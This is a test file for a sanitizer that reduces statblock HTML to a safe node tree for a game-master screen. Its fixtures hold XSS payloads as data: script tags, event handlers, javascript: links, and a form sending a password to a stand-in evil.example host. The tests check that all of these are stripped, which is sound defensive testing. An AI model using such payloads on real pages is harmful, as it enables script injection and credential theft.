// @vitest-environment jsdom
import { describe, expect, it } from 'vitest';
import { STATBLOCK_STYLE_CLASSES } from '../../../../src/app/online/gmScreen/statblocks/drawnClasses.ts';
import { drawnTree, MAX_DRAWN_BYTES, type PortraitOf } from '../../../../src/app/online/gmScreen/statblocks/drawnTree.ts';
import {
  MAX_DRAWN_DEPTH, MAX_DRAWN_NODES, MAX_DRAWN_TEXT, parseDrawnNodes, parseGmScreenMessage, type DrawnNode,
} from '../../../../src/app/online/protocol/index.ts';

const PORTRAIT = 'a'.repeat(64);
/** A portrait for the one vault picture the test names, none for any other address. */
const portraitOf: PortraitOf = (image) => (image.getAttribute('src') === 'app://vault/Art/Hag.png' ? PORTRAIT : null);

function drawn(html: string): { nodes: readonly DrawnNode[]; cut: boolean; json: string } {
  const root = document.createElement('div');
  root.innerHTML = html;
  const tree = drawnTree(root, portraitOf);
  return { ...tree, json: JSON.stringify(tree.nodes) };
}

/** What the page reads of a tree: the protocol's own parser, as a sealed message would reach it. */
function received(nodes: readonly DrawnNode[]): unknown {
  return parseGmScreenMessage({ t: 'statblock', id: 's1', nodes, cut: false });
}

function depthOf(nodes: readonly DrawnNode[]): number {
  return Math.max(0, ...nodes.map((node) => (typeof node === 'string' ? 1 : 1 + depthOf(node.k ?? []))));
}

function countOf(nodes: readonly DrawnNode[]): number {
  return nodes.reduce((sum, node) => sum + 1 + (typeof node === 'string' ? 0 : countOf(node.k ?? [])), 0);
}

describe('a statblock drawn for a GM screen device', () => {
  it('leaves out scripts, handlers, frames, objects and form fields with everything they hold', () => {
    const { nodes, json } = drawn(`
      <div class="atlas-sb-item" onclick="alert('click')">
        <script>alert('script')</script><style>body { background: url(https://evil.example/x) }</style>
        <iframe src="https://evil.example/frame">frame text</iframe><object data="evil.swf">object text</object><embed src="evil.swf">
        <form action="https://evil.example/steal"><input type="text" name="password" value="secret-value"><textarea>secret-text</textarea>
        <select><option>secret-option</option></select></form><template><p>template text</p></template>
        <noscript>noscript text</noscript><video src="evil.mp4">video text</video>
        <p onmouseover="alert('hover')">kept text</p>
      </div>`);

    for (const word of ['alert', 'evil', 'secret', 'frame text', 'object text', 'template', 'noscript', 'video', 'onclick', 'onmouseover', 'password']) {
      expect(json).not.toContain(word);
    }
    expect(json).toContain('kept text');
    expect(received(nodes)).not.toBeNull();
  });

  it('keeps a picture only as the hash of a vault portrait, never by its address or with its handlers', () => {
    const { nodes, json } = drawn(`
      <img src="app://vault/Art/Hag.png" onerror="alert(1)" alt="Hag" class="atlas-sb-portrait-image">
      <img src="https://evil.example/tracker.png" onerror="alert(2)">
      <img src="javascript:alert(3)"><img src="data:image/png;base64,AAAA"><img src="app://vault/Art/Other.png">`);

    expect(nodes.filter((node) => typeof node !== 'string')).toEqual([{ e: 'img', c: ['atlas-sb-portrait-image'], src: PORTRAIT }]);
    for (const word of ['Art/', 'app://', 'evil', 'javascript', 'data:', 'onerror', 'alert']) expect(json).not.toContain(word);
  });

  it('makes links their text, whatever their address', () => {
    const { nodes, json } = drawn('<p>Trades a <a href="javascript:alert(1)" class="internal-link">Sunken Relic</a> for <a href="https://evil.example">safe passage</a>.</p>');

    expect(nodes).toEqual([{ e: 'p', k: ['Trades a Sunken Relic for safe passage.'] }]);
    expect(json).not.toContain('href');
  });

  it('keeps only the listed classes, data attributes and style properties, each with a value it may hold', () => {
    const { nodes } = drawn(`
      <div class="atlas-sb-item atlas-sb-item--fill modal-container is-open evil" data-type="property" data-block="stat" data-prop="hp"
        data-look="<script>" data-onload="x" data-level="9" style="background: url(https://evil.example/x); position: fixed;
        --atlas-sb-column-width: 22em; --atlas-sb-max-columns: calc(1 + 1); width: 50%; text-align: center; color: red"></div>
      <span class="atlas-token-ring" style="--atlas-token-ring-color: #3a7d44"></span>
      <span class="atlas-token-ring" style="--atlas-token-ring-color: url(https://evil.example/ring)"></span>`);

    expect(nodes.filter((node) => typeof node !== 'string')).toEqual([
      {
        e: 'div', c: ['atlas-sb-item', 'atlas-sb-item--fill'], d: { block: 'stat', type: 'property' },
        s: { '--atlas-sb-column-width': '22em', 'text-align': 'center', width: '50%' },
      },
      { e: 'span', c: ['atlas-token-ring'], s: { '--atlas-token-ring-color': '#3a7d44' } },
      { e: 'span', c: ['atlas-token-ring'] },
    ]);
  });

  it('shows controls as plain elements that keep their look and state, and an icon by its name alone', () => {
    const { nodes } = drawn(`
      <button class="btn btn--ghost btn--icon" onclick="alert(1)"><svg class="lucide lucide-minus"><script>alert(2)</script><path d="M5 12h14"/></svg></button>
      <input type="checkbox" class="stat-value hp-2" checked><input type="checkbox" class="hp-3"><input type="text" value="secret">
      <span class="atlas-dice-link" data-formula="2d6+3" role="button" tabindex="0" aria-label="Roll 2d6+3">2d6+3</span>`);

    expect(nodes.filter((node) => typeof node !== 'string')).toEqual([
      { e: 'span', c: ['btn', 'btn--ghost', 'btn--icon'], k: [{ e: 'span', c: ['lucide', 'lucide-minus'] }] },
      { e: 'span', c: ['stat-value', 'hp-2', 'atlas-sb-pip', 'is-checked'] },
      { e: 'span', c: ['atlas-sb-pip'] },
      { e: 'span', c: ['atlas-dice-link'], dice: '2d6+3', k: ['2d6+3'] },
    ]);
  });

  it('leaves out what is hidden, and keeps a table cell\'s span', () => {
    const { nodes } = drawn(`
      <span hidden>Pip 1 of 3</span><span style="display: none">gone</span><p>shown</p>
      <table><tbody><tr><td colspan="2" rowspan="3" onclick="x">cell</td></tr></tbody></table>`);

    expect(JSON.stringify(nodes)).not.toMatch(/Pip|gone/);
    expect(nodes.filter((node) => typeof node !== 'string')).toEqual([
      { e: 'p', k: ['shown'] },
      { e: 'table', k: [{ e: 'tbody', k: [{ e: 'tr', k: [{ e: 'td', colspan: 2, rowspan: 3, k: ['cell'] }] }] }] },
    ]);
  });

  it('keeps what an unknown element holds, and leaves out elements of other namespaces', () => {
    const { nodes, json } = drawn('<details><summary>Lair</summary><mjx-container>x²</mjx-container></details><math><mi>secret</mi></math>');

    expect(nodes).toEqual(['Lairx²']);
    expect(json).not.toContain('secret');
  });

  it('cuts a statblock nested deeper than a tree may go, and the page reads what is left', () => {
    const deep = `${'<div class="atlas-sb-item">'.repeat(100)}bottom${'</div>'.repeat(100)}<p>after</p>`;
    const { nodes, cut } = drawn(deep);

    expect(cut).toBe(true);
    expect(depthOf(nodes)).toBeLessThanOrEqual(MAX_DRAWN_DEPTH);
    expect(parseDrawnNodes(nodes)).toEqual(nodes);
  });

  it('cuts a statblock of more elements than a tree may hold', () => {
    const { nodes, cut } = drawn('<span class="atlas-sb-value">x</span>'.repeat(MAX_DRAWN_NODES));

    expect(cut).toBe(true);
    expect(countOf(nodes)).toBeLessThanOrEqual(MAX_DRAWN_NODES);
    expect(parseDrawnNodes(nodes)).toEqual(nodes);
  });

  it('cuts a statblock of more text than a tree may hold', () => {
    const { nodes, cut } = drawn(`<p>${'a'.repeat(MAX_DRAWN_TEXT + 5000)}</p>`);

    expect(cut).toBe(true);
    expect(JSON.stringify(nodes)).toHaveLength(`[{"e":"p","k":[""]}]`.length + MAX_DRAWN_TEXT);
    expect(parseDrawnNodes(nodes)).toEqual(nodes);
  });

  it('cuts a statblock whose message would be larger than one message may be', () => {
    // As many of the longest classes a drawn element may keep as it may hold: far more than a message takes, at the most elements.
    const classes = [...STATBLOCK_STYLE_CLASSES].sort((a, b) => b.length - a.length).slice(0, 16).join(' ');
    const html = `<div data-block-id="${'x'.repeat(64)}" class="${classes}" data-cls="${'y'.repeat(64)}">${'é'.repeat(15)}</div>`.repeat(MAX_DRAWN_NODES / 2);
    const { nodes, cut, json } = drawn(html);

    expect(cut).toBe(true);
    expect(new TextEncoder().encode(json).length).toBeLessThanOrEqual(MAX_DRAWN_BYTES);
    expect(parseDrawnNodes(nodes)).toEqual(nodes);
  });

  it('is read by the page as it was written', () => {
    const { nodes } = drawn(`
      <div class="atlas-statblock atlas-sb-sheet" data-layout="5e-2014-rules"><div class="atlas-sb-columns" style="--atlas-sb-column-width: 22em; --atlas-sb-max-columns: 2">
      <div class="atlas-sb-item" data-type="heading" data-block="title" data-block-id="header-name"><h1 class="atlas-sb-heading" data-level="1">Marsh Hag</h1></div>
      <hr class="atlas-sb-divider"><img src="app://vault/Art/Hag.png"><br><p>82 (<span class="atlas-dice-link" data-formula="11d8+33">11d8+33</span>)</p></div></div>`);

    expect(parseDrawnNodes(nodes)).toEqual(nodes);
  });
});
